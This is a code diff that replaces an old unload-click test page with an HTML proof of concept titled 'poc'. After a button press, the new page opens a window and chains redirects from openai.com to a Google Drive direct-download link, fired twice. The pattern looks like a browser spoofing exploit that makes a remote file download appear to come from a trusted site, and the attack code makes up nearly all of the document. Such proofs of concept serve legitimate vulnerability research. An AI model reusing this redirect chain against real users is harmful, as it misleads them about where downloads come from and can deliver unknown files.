@@ -1,19 +1,29 @@
+<!DOCTYPE html>
 <html>
-<body>
-<script>
-function sendPing() {
-  var anc = document.createElement("a");
-  anc.setAttribute("href", "http://www.google.com/");
-  document.body.appendChild(anc);
+<head>
+  <meta charset="UTF-8">
+  <title>poc</title>
+  <script>
+    function chainRedirect(w, urls, index = 0) {
+      if (index < urls.length) {
+        w.location.replace(urls[index]);
+        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
+      }
+    }
 
-  var evt = document.createEvent("MouseEvents");
-  evt.initMouseEvent(
-      "click", true, true, window, 1, 0, 0, 0, 0,
-      false, false, false, false, 0, anc);
-  anc.dispatchEvent(evt);
-}
-addEventListener("unload", function() { sendPing(); }, false);
-</script>
-<a href="http://www.yahoo.com/">yahoo</a>
+    function startRedirect() {
+      let w = window.open("");
+      setTimeout(() => {
+        chainRedirect(w, [
+        "https://openai.com",
+        "https://drive.usercontent.google.com/download?id=1pyh3Gp20w9m4sy4BYAls38IbEN2t8RNY&export=download&authuser=0&confirm=t&uuid=a0187592-23da-4e90-bce3-d18c37483ff7&at=AN8xHoom8UDsa0rGI1HwSYH-pLYo:1756640251918",
+        "https://drive.usercontent.google.com/download?id=1pyh3Gp20w9m4sy4BYAls38IbEN2t8RNY&export=download&authuser=0&confirm=t&uuid=a0187592-23da-4e90-bce3-d18c37483ff7&at=AN8xHoom8UDsa0rGI1HwSYH-pLYo:1756640251918",
+        ]);
+      }, 1000);
+    }
+  </script>
+</head>
+<body>
+  <button onclick="startRedirect()">Start</button>
 </body>
 </html>
